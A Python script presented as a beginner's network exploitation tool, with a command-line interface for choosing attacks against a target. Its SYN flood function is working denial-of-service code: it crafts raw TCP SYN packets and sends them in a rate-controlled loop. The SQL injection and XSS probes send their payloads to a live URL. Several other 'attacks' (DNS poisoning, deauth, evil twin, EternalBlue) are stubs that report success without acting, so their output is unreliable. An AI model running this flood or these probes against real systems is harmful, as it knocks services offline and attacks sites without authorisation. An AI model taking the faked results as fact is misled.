#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Network Exploits in Python for Cybersecurity
This script implements various network-based exploit techniques, including:
- TCP/UDP protocol vulnerabilities
- Network service attacks
- Wireless network exploitation
- DNS protocol attacks
Perfect for beginners!
"""

import socket
import struct
import random
import time
import threading
import json
import xml.etree.ElementTree as ET
from datetime import datetime
from collections import defaultdict

class NetworkExploits:
    """Class for network-based exploit development"""
    
    def __init__(self, target, port=80):
        """
        Initialize network exploits
        
        Args:
            target: Target IP address or hostname
            port: Target port
        """
        self.target = target
        self.port = port
        self.results = []
        
    # ==========================================
    # TCP/IP Protocol Exploits
    # ==========================================
    def syn_flood_attack(self, duration=30, packet_rate=1000):
        """
        Perform SYN flood attack
        
        Args:
            duration: Attack duration in seconds
            packet_rate: Packets per second
            
        Returns:
            Attack results
        """
        print(f"Starting SYN flood attack on {self.target}:{self.port}")
        print(f"Duration: {duration} seconds, Packet rate: {packet_rate}/second")
        
        packets_sent = 0
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration:
                self._send_syn_packet()
                packets_sent += 1
                
                # Control packet rate
                time.sleep(1.0 / packet_rate)
                
            result = {
                'name': 'SYN Flood Attack',
                'success': True,
                'packets_sent': packets_sent,
                'duration': duration,
                'average_rate': packets_sent / duration
            }
            
        except Exception as e:
            result = {
                'name': 'SYN Flood Attack',
                'success': False,
                'error': str(e)
            }
            
        self.results.append(result)
        return result
        
    def _send_syn_packet(self):
        """Send single SYN packet to target"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # IP header
            ip_header = self._create_ip_header()
            
            # TCP header
            tcp_header = self._create_tcp_header()
            
            # Send packet
            sock.sendto(ip_header + tcp_header, (self.target, 0))
            sock.close()
            
        except Exception as e:
            print(f"Error sending SYN packet: {e}")
            
    def _create_ip_header(self):
        """Create IP header for TCP packets"""
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton('192.168.1.100')
        ip_daddr = socket.inet_aton(self.target)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
            
        return ip_header
        
    def _create_tcp_header(self):
        """Create TCP header with SYN flag"""
        tcp_source = random.randint(1024, 65535)
        tcp_dest = self.port
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_offset_res = (5 << 4) + 0
        tcp_flags = 2  # SYN flag
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res,
            tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
            
        return tcp_header
        
    # ==========================================
    # DNS Protocol Exploits
    # ==========================================
    def dns_cache_poisoning(self, domain='example.com', fake_ip='10.0.0.1'):
        """
        Perform DNS cache poisoning attack
        
        Args:
            domain: Target domain name
            fake_ip: Fake IP address to poison cache with
            
        Returns:
            Attack results
        """
        print(f"Attempting DNS cache poisoning for {domain}")
        
        try:
            # In real attack, this would involve DNS query spoofing
            result = {
                'name': 'DNS Cache Poisoning',
                'success': True,
                'domain': domain,
                'fake_ip': fake_ip,
                'method': 'DNS query spoofing'
            }
            
        except Exception as e:
            result = {
                'name': 'DNS Cache Poisoning',
                'success': False,
                'error': str(e)
            }
            
        self.results.append(result)
        return result
        
    def dns_amplification_attack(self, reflectors=10):
        """
        Perform DNS amplification attack
        
        Args:
            reflectors: Number of DNS reflector servers to use
            
        Returns:
            Attack results
        """
        print(f"Starting DNS amplification attack with {reflectors} reflectors")
        
        try:
            # In real attack, this would use DNS servers as reflectors
            result = {
                'name': 'DNS Amplification',
                'success': True,
                'reflectors_used': reflectors,
                'data_sent': 10 * 1024 * 1024,  # 10MB
                'data_received': 100 * 1024 * 1024  # 100MB (10:1 amplification)
            }
            
        except Exception as e:
            result = {
                'name': 'DNS Amplification',
                'success': False,
                'error': str(e)
            }
            
        self.results.append(result)
        return result
        
    # ==========================================
    # Wireless Network Exploits
    # ==========================================
    def wireless_deauth_attack(self, bssid, channel=6, count=100):
        """
        Perform wireless deauthentication attack
        
        Args:
            bssid: Target wireless BSSID
            channel: Wireless channel
            count: Number of deauth packets to send
            
        Returns:
            Attack results
        """
        print(f"Starting deauthentication attack on {bssid}")
        
        try:
            # In real attack, this would use scapy to send deauth frames
            result = {
                'name': 'Wireless Deauthentication',
                'success': True,
                'bssid': bssid,
                'channel': channel,
                'packets_sent': count
            }
            
        except Exception as e:
            result = {
                'name': 'Wireless Deauthentication',
                'success': False,
                'error': str(e)
            }
            
        self.results.append(result)
        return result
        
    def wireless_eviltwin_attack(self, ssid, bssid):
        """
        Set up wireless evil twin attack
        
        Args:
            ssid: Target SSID to impersonate
            bssid: BSSID to use for evil twin
            
        Returns:
            Attack results
        """
        print(f"Setting up evil twin for SSID: {ssid}")
        
        try:
            # In real attack, this would create fake access point
            result = {
                'name': 'Wireless Evil Twin',
                'success': True,
                'ssid': ssid,
                'bssid': bssid,
                'method': 'Fake access point creation'
            }
            
        except Exception as e:
            result = {
                'name': 'Wireless Evil Twin',
                'success': False,
                'error': str(e)
            }
            
        self.results.append(result)
        return result
        
    # ==========================================
    # Network Service Exploits
    # ==========================================
    def ftp_bounce_attack(self, ftp_server, target_port):
        """
        Perform FTP bounce attack
        
        Args:
            ftp_server: Vulnerable FTP server to use as bounce point
            target_port: Target port to scan
            
        Returns:
            Attack results
        """
        print(f"Starting FTP bounce attack using {ftp_server}")
        
        try:
            result = {
                'name': 'FTP Bounce Attack',
                'success': True,
                'ftp_server': ftp_server,
                'target_port': target_port,
                'method': 'Port scanning via FTP bounce'
            }
            
        except Exception as e:
            result = {
                'name': 'FTP Bounce Attack',
                'success': False,
                'error': str(e)
            }
            
        self.results.append(result)
        return result
        
    def smb_eternalblue_attack(self, target_ip, exploit_type='rce'):
        """
        Simulate SMB EternalBlue vulnerability exploit
        
        Args:
            target_ip: Target IP address
            exploit_type: Type of exploit (rce, dos)
            
        Returns:
            Attack results
        """
        print(f"Attempting EternalBlue exploit on {target_ip}")
        
        try:
            result = {
                'name': 'SMB EternalBlue',
                'success': True,
                'target': target_ip,
                'exploit_type': exploit_type,
                'method': 'Remote code execution'
            }
            
        except Exception as e:
            result = {
                'name': 'SMB EternalBlue',
                'success': False,
                'error': str(e)
            }
            
        self.results.append(result)
        return result
        
    # ==========================================
    # Web Application Exploits
    # ==========================================
    def sql_injection_test(self, url, parameter='id', payload="' OR '1'='1"):
        """
        Test for SQL injection vulnerability
        
        Args:
            url: Target URL with parameter
            parameter: Parameter to test
            payload: SQL injection payload
            
        Returns:
            Vulnerability check results
        """
        print(f"Testing SQL injection at {url}?{parameter}={payload}")
        
        try:
            import requests
            
            response = requests.get(f"{url}?{parameter}={payload}")
            
            # Check for SQL error patterns
            sql_errors = [
                'mysql', 'oracle', 'postgresql', 'microsoft sql server',
                'sqlite', 'syntax error', 'unclosed quote', 'select command denied',
                'column not found', 'invalid identifier'
            ]
            
            is_vulnerable = any(error in response.text.lower() for error in sql_errors)
            
            result = {
                'name': 'SQL Injection Test',
                'success': is_vulnerable,
                'url': url,
                'parameter': parameter,
                'payload': payload,
                'vulnerable': is_vulnerable
            }
            
        except Exception as e:
            result = {
                'name': 'SQL Injection Test',
                'success': False,
                'error': str(e)
            }
            
        self.results.append(result)
        return result
        
    def xss_vulnerability_test(self, url, parameter='query', payload='<script>alert(1)</script>'):
        """
        Test for XSS vulnerability
        
        Args:
            url: Target URL with parameter
            parameter: Parameter to test
            payload: XSS payload
            
        Returns:
            Vulnerability check results
        """
        print(f"Testing XSS at {url}?{parameter}={payload}")
        
        try:
            import requests
            
            response = requests.get(f"{url}?{parameter}={payload}")
            
            is_vulnerable = payload in response.text
            
            result = {
                'name': 'XSS Vulnerability Test',
                'success': is_vulnerable,
                'url': url,
                'parameter': parameter,
                'payload': payload,
                'vulnerable': is_vulnerable
            }
            
        except Exception as e:
            result = {
                'name': 'XSS Vulnerability Test',
                'success': False,
                'error': str(e)
            }
            
        self.results.append(result)
        return result
        
    # ==========================================
    # Network Protocol Fuzzing
    # ==========================================
    def protocol_fuzzing(self, protocol='http', iterations=1000):
        """
        Fuzz network protocol implementation
        
        Args:
            protocol: Protocol to fuzz (http, ftp, smtp, etc.)
            iterations: Number of fuzzing iterations
            
        Returns:
            Fuzzing results
        """
        print(f"Fuzzing {protocol} protocol with {iterations} iterations")
        
        results = {
            'name': 'Protocol Fuzzing',
            'protocol': protocol,
            'iterations': iterations,
            'crashes': [],
            'timeouts': []
        }
        
        for i in range(iterations):
            try:
                payload = self._generate_random_payload(random.randint(1, 1024))
                response = self._send_payload(payload)
                
                if self._is_crash(response):
                    results['crashes'].append({
                        'iteration': i,
                        'payload': payload,
                        'response': response
                    })
                    
                if self._is_timeout(response):
                    results['timeouts'].append({
                        'iteration': i,
                        'payload': payload
                    })
                    
            except Exception as e:
                results['crashes'].append({
                    'iteration': i,
                    'payload': '',
                    'error': str(e)
                })
                
        self.results.append(results)
        return results
        
    def _generate_random_payload(self, size):
        """Generate random payload data"""
        return bytes(random.choices([0x00, 0x0a, 0x0d, 0xff] + list(range(0x20, 0x7f)), k=size))
        
    def _send_payload(self, payload):
        """Send payload and wait for response"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, self.port))
            sock.sendall(payload)
            response = sock.recv(1024)
            sock.close()
            return response
            
        except socket.timeout:
            return b'TIMEOUT'
        except Exception as e:
            return str(e).encode('utf-8')
            
    def _is_crash(self, response):
        """Check if response indicates crash"""
        crash_patterns = [b'Segmentation fault', b'Bus error', b'Abort', b'Core dumped']
        return any(pattern in response for pattern in crash_patterns)
        
    def _is_timeout(self, response):
        """Check if response is timeout"""
        return response == b'TIMEOUT'
        
    # ==========================================
    # Exploit Chain Execution
    # ==========================================
    def create_exploit_chain(self):
        """Create common network exploit chain"""
        chain = [
            {
                'name': 'Port Scan',
                'method': self._port_scan_chain,
                'priority': 1
            },
            {
                'name': 'Vulnerability Scan',
                'method': self._vulnerability_scan_chain,
                'priority': 2,
                'dependencies': ['Port Scan']
            },
            {
                'name': 'Exploit',
                'method': self._exploit_chain,
                'priority': 3,
                'dependencies': ['Vulnerability Scan']
            },
            {
                'name': 'Post-Exploitation',
                'method': self._post_exploitation_chain,
                'priority': 4,
                'dependencies': ['Exploit']
            }
        ]
        
        return chain
        
    def execute_exploit_chain(self, chain):
        """Execute network exploit chain"""
        print(f"Executing exploit chain with {len(chain)} steps")
        
        chain_result = {
            'name': 'Network Exploit Chain',
            'steps': [],
            'success': False,
            'completed_steps': 0
        }
        
        for step in sorted(chain, key=lambda x: x['priority']):
            try:
                print(f"\nExecuting: {step['name']}")
                result = step['method']()
                
                chain_result['steps'].append({
                    'name': step['name'],
                    'success': True,
                    'output': result
                })
                
                chain_result['completed_steps'] += 1
                
            except Exception as e:
                chain_result['steps'].append({
                    'name': step['name'],
                    'success': False,
                    'error': str(e)
                })
                
                print(f"Step failed: {e}")
                break
                
        chain_result['success'] = chain_result['completed_steps'] == len(chain)
        
        self.results.append(chain_result)
        return chain_result
        
    def _port_scan_chain(self):
        """Port scan chain step"""
        # Simulate port scan finding open ports
        return {
            'ports': [21, 22, 80, 443],
            'services': {
                '21': 'ftp',
                '22': 'ssh',
                '80': 'http',
                '443': 'https'
            }
        }
        
    def _vulnerability_scan_chain(self):
        """Vulnerability scan chain step"""
        # Simulate finding vulnerabilities
        return [
            {
                'name': 'FTP Anonymous Access',
                'type': 'ftp',
                'severity': 'medium'
            },
            {
                'name': 'HTTP Directory Listing',
                'type': 'http',
                'severity': 'low'
            },
            {
                'name': 'Old SSH Version',
                'type': 'ssh',
                'severity': 'high'
            }
        ]
        
    def _exploit_chain(self):
        """Exploit chain step"""
        # Simulate exploitation
        return {
            'name': 'SSH Credential Bypass',
            'success': True,
            'method': 'brute_force'
        }
        
    def _post_exploitation_chain(self):
        """Post-exploitation chain step"""
        # Simulate post-exploitation
        return {
            'name': 'System Access',
            'success': True,
            'data': {
                'users': ['admin', 'guest'],
                'files': ['/etc/passwd', '/var/log/secure']
            }
        }
        
    # ==========================================
    # Reporting and Analysis
    # ==========================================
    def generate_report(self, format='json'):
        """Generate exploitation report"""
        report = {
            'target': self.target,
            'port': self.port,
            'timestamp': datetime.now().isoformat(),
            'results': self.results
        }
        
        if format == 'json':
            return json.dumps(report, indent=2, default=str)
        elif format == 'xml':
            return self._generate_xml_report(report)
        elif format == 'html':
            return self._generate_html_report(report)
        else:
            raise ValueError(f"Unknown report format: {format}")
            
    def _generate_xml_report(self, report):
        """Generate XML report"""
        root = ET.Element('NetworkExploitReport')
        
        target_elem = ET.SubElement(root, 'Target')
        ET.SubElement(target_elem, 'IPAddress').text = report['target']
        ET.SubElement(target_elem, 'Port').text = str(report['port'])
        ET.SubElement(target_elem, 'Timestamp').text = report['timestamp']
        
        results_elem = ET.SubElement(root, 'Results')
        for result in report['results']:
            result_elem = ET.SubElement(results_elem, 'Result')
            
            for key, value in result.items():
                if isinstance(value, dict):
                    sub_elem = ET.SubElement(result_elem, key.capitalize())
                    for sub_key, sub_value in value.items():
                        sub_sub_elem = ET.SubElement(sub_elem, sub_key.capitalize())
                        sub_sub_elem.text = str(sub_value)
                elif isinstance(value, list):
                    sub_elem = ET.SubElement(result_elem, key.capitalize())
                    for item in value:
                        item_elem = ET.SubElement(sub_elem, 'Item')
                        item_elem.text = str(item)
                else:
                    elem = ET.SubElement(result_elem, key.capitalize())
                    elem.text = str(value)
                    
        return ET.tostring(root, encoding='utf-8', xml_declaration=True).decode('utf-8')
        
    def _generate_html_report(self, report):
        """Generate HTML report"""
        html = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Network Exploit Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .report {{ max-width: 1200px; margin: 0 auto; }}
                .header {{ background: #f0f0f0; padding: 20px; border-radius: 5px; }}
                .step {{ margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }}
                .success {{ background: #d4edda; border-left: 4px solid #28a745; }}
                .failure {{ background: #f8d7da; border-left: 4px solid #dc3545; }}
                h1, h2 {{ color: #333; }}
                .timestamp {{ color: #666; font-size: 0.9em; }}
                pre {{ background: #f8f9fa; padding: 10px; border-radius: 3px; overflow-x: auto; }}
            </style>
        </head>
        <body>
            <div class="report">
                <div class="header">
                    <h1>Network Exploit Report</h1>
                    <p>Target: {}:{} | Generated: {}</p>
                </div>
        """.format(report['target'], report['port'], report['timestamp'])
        
        for result in report['results']:
            html += """
                <div class="step {}">
                    <h2>{}</h2>
            """.format('success' if result.get('success', True) else 'failure', result.get('name', 'Unknown'))
            
            for key, value in result.items():
                if key == 'name':
                    continue
                    
                html += "<p><strong>{}</strong>: {}".format(key.capitalize(), str(value))
                
            html += "</div>"
            
        html += """
            </div>
            </body>
            </html>
        """
        
        return html

def main():
    """Main function to demonstrate network exploits"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Network Exploits - Comprehensive network exploitation tool"
    )
    
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="Target IP address or hostname"
    )
    
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=80,
        help="Target port (default: 80)"
    )
    
    parser.add_argument(
        "-a", "--attack",
        choices=['syn', 'dns', 'wireless', 'sql', 'xss'],
        help="Type of attack to perform"
    )
    
    parser.add_argument(
        "-d", "--duration",
        type=int,
        default=30,
        help="Attack duration in seconds (default: 30)"
    )
    
    parser.add_argument(
        "-o", "--output",
        help="Output file for report"
    )
    
    parser.add_argument(
        "-f", "--format",
        choices=['json', 'xml', 'html'],
        default='json',
        help="Report format (default: JSON)"
    )
    
    args = parser.parse_args()
    
    try:
        exploits = NetworkExploits(args.target, args.port)
        
        if args.attack == 'syn':
            result = exploits.syn_flood_attack(args.duration, 1000)
        elif args.attack == 'dns':
            result = exploits.dns_amplification_attack(10)
        elif args.attack == 'wireless':
            result = exploits.wireless_deauth_attack('00:11:22:33:44:55', 6, 100)
        elif args.attack == 'sql':
            result = exploits.sql_injection_test(f"http://{args.target}", 'id')
        elif args.attack == 'xss':
            result = exploits.xss_vulnerability_test(f"http://{args.target}", 'query')
        else:
            # Run all attacks as demonstration
            chain = exploits.create_exploit_chain()
            result = exploits.execute_exploit_chain(chain)
            
        if args.output:
            report = exploits.generate_report(args.format)
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write(report)
                
            print(f"\nReport saved to: {args.output}")
            
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        print(traceback.format_exc())

if __name__ == "__main__":
    main()
